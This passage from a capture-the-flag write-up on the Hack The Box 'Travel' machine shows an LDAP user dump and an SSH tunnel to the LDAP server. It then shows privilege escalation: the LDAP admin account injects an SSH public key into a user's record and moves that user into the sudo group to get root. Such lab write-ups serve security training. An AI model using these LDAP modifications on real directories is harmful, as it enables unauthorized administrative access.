# jerry, users, linux, servers, travel.htb
dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: jerry
uidNumber: 5006
homeDirectory: /home/jerry
givenName: Jerry
gidNumber: 5000
sn: Morgan
cn: Jerry Morgan
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# lynik, users, linux, servers, travel.htb
dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: lynik
uidNumber: 5000
homeDirectory: /home/lynik
givenName: Lynik
gidNumber: 5000
sn: Schmidt
cn: Lynik Schmidt
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# edward, users, linux, servers, travel.htb
dn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: edward
uidNumber: 5009
homeDirectory: /home/edward
givenName: Edward
gidNumber: 5000
sn: Roberts
cn: Edward Roberts
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# eugene, users, linux, servers, travel.htb
dn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: eugene
cn: Eugene Scott
sn: Scott
givenName: Eugene
loginShell: /bin/bash
uidNumber: 5008
gidNumber: 5000
homeDirectory: /home/eugene
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

# gloria, users, linux, servers, travel.htb
dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: gloria
uidNumber: 5010
homeDirectory: /home/gloria
givenName: Gloria
gidNumber: 5000
sn: Wood
cn: Gloria Wood
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# johnny, users, linux, servers, travel.htb
dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: johnny
cn: Johnny Miller
sn: Miller
givenName: Johnny
loginShell: /bin/bash
uidNumber: 5004
gidNumber: 5000
homeDirectory: /home/johnny
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

# louise, users, linux, servers, travel.htb
dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: louise
cn: Louise Griffin
sn: Griffin
givenName: Louise
loginShell: /bin/bash
uidNumber: 5007
gidNumber: 5000
homeDirectory: /home/louise
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

# christopher, users, linux, servers, travel.htb
dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: christopher
uidNumber: 5003
homeDirectory: /home/christopher
givenName: Christopher
gidNumber: 5000
sn: Ward
cn: Christopher Ward
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# domainusers, groups, linux, servers, travel.htb
dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
memberUid: frank
memberUid: brian
memberUid: christopher
memberUid: johnny
memberUid: julia
memberUid: jerry
memberUid: louise
memberUid: eugene
memberUid: edward
memberUid: gloria
memberUid: lynik
gidNumber: 5000
cn: domainusers
objectClass: top
objectClass: posixGroup

# search result
search: 2
result: 0 Success

# numResponses: 22
# numEntries: 21
```

I managed to dump the full LDAP database and got a list of users.  

Because `lynik-admin` is an LDAP administrator, I could now alter user and device attributes held in the LDAP database.  On a Windows domain this kind of access could let me bump a user up to domain admin; here I'll instead use it to elevate a user to root.  Editing LDAP via raw queries is quite tedious, so I reached for Apache's Directory Studio and its clean GUI.  It's a free download from [https://directory.apache.org/studio/downloads.html](https://directory.apache.org/studio/downloads.html).

need to port forward 389 \(need sudo rights for low port\)

tried portforwarding using localhost and 127.0.0.1, but failed to connect, checked ip a and /etc/hosts to find out more and noticed 172.20.0.10

ssh port forward tunnel

```text
lynik-admin@travel:/var$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:b9:bc:d0 brd ff:ff:ff:ff:ff:ff
    inet <YOUR_IP>/24 brd <YOUR_IP> scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:eb:d3:9e:f4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-836575a2ebbb: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0e:57:82:22 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb
       valid_lft forever preferred_lft forever
5: br-8ec6dcae5ba1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:62:92:81:b4 brd ff:ff:ff:ff:ff:ff
    inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1
       valid_lft forever preferred_lft forever
7: vetha779908@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
    link/ether 72:de:2f:8b:3d:cc brd ff:ff:ff:ff:ff:ff link-netnsid 0
9: vethef87583@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
    link/ether 1a:aa:24:64:cc:d9 brd ff:ff:ff:ff:ff:ff link-netnsid 1
11: vethad21680@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-836575a2ebbb state UP group default 
    link/ether d2:d3:97:5f:1e:6d brd ff:ff:ff:ff:ff:ff link-netnsid 2
13: vethd1561b2@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
    link/ether da:10:aa:7a:cb:5f brd ff:ff:ff:ff:ff:ff link-netnsid 3
15: veth5af27ca@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
    link/ether 02:e7:02:1d:f1:36 brd ff:ff:ff:ff:ff:ff link-netnsid 5
17: veth94d1920@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-836575a2ebbb state UP group default 
    link/ether e6:86:a7:88:79:dd brd ff:ff:ff:ff:ff:ff link-netnsid 4

lynik-admin@travel:/var$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 travel
172.20.0.10 ldap.travel.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

checked `ip a` and /etc/hosts to find out more and noticed 172.20.0.10

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ sudo ssh -L 389:172.20.0.10:389 lynik-admin@<YOUR_IP> 
[sudo] password for kac0: 
The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
ECDSA key fingerprint is SHA256:KSjh2mhuESUZQcaB1ewLHie9gTUCmvOlypvBpcyAF/w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
lynik-admin@<YOUR_IP>'s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 19 Sep 2020 03:46:50 PM UTC

  System load:                      0.0
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        198
  Users logged in:                  0
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            <YOUR_IP>

Last login: Sat Sep 19 15:46:18 2020 from 10.10.15.53
lynik-admin@travel:~$
```

login as `lynik` failed with password, but it says that only an ssh key can be used to login

[https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap)

> According to the sshd\_config manpage, the AuthorizedKeysCommand configuration is used to specify the program from which the SSH server retrieves user public keys from. The sss\_ssh\_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP.

So I went on to add the public key attribute to the `lynik` user. I first had to add a new objectClass attribute and pick ldapPublicKey, then I added the sshPublicKey attribute to `lynik`, hit `Edit as Text` in the editor, and pasted in the public key.

searching for ssh keys and ldap led to [https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap) which shows that it is possible to add keys through ldap

pictures

## enumeration as `lynik`

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ ssh lynik@<YOUR_IP> -i lynik 
Creating directory '/home@TRAVEL/lynik'.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 19 Sep 2020 04:07:29 PM UTC

  System load:                      0.0
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        201
  Users logged in:                  1
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            <YOUR_IP>

          *** Travel.HTB News Flash ***
We are currently experiencing some delay in domain
replication times of about 3-5 seconds. Sorry for
the inconvenience. Kind Regards, admin

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

lynik@travel:~$ id
uid=5000(lynik) gid=5000(domainusers) groups=5000(domainusers)
lynik@travel:~$
```

Since lynik-admin is an ldap admin and can modify anything, I tried setting lynik uid and gid to 0 \(root\) but then was denied ssh login due to configuration to deny root login;

```text
lynik@travel:/var$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,trvl-admin
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:trvl-admin
floppy:x:25:
tape:x:26:
sudo:x:27:trvl-admin
audio:x:29:
dip:x:30:trvl-admin
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:trvl-admin
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:trvl-admin
systemd-coredump:x:999:
trvl-admin:x:1000:
lynik-admin:x:1001:
docker:x:117:
sssd:x:118:
```

I looked at the sudoers file and saw that admins and members of the sudo group can run every command as root, so I set the group id to 27 \(sudo\), logged out, and logged back in

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ ssh lynik@<YOUR_IP> -i lynik
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 19 Sep 2020 04:12:42 PM UTC

  System load:                      0.06
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        197
  Users logged in:                  1
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            <YOUR_IP>

Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

lynik@travel:~$ id
uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)

┌──(kac0㉿kali)-[~/htb/travel]
└─$ ssh lynik@<YOUR_IP> -i lynik
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 19 Sep 2020 04:12:42 PM UTC

  System load:                      0.06
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        197
  Users logged in:                  1
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            <YOUR_IP>

Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

lynik@travel:~$ id
uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)
```

### Getting a shell

after adding this user to the sudoers group:

```text
lynik@travel:~$ sudo -l
[sudo] password for lynik: 
Matching Defaults entries for lynik on travel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lynik may run the following commands on travel:
    (ALL : ALL) ALL
lynik@travel:~$ sudo su -
root@travel:~# cat root.txt 
5500************************5eb0
```
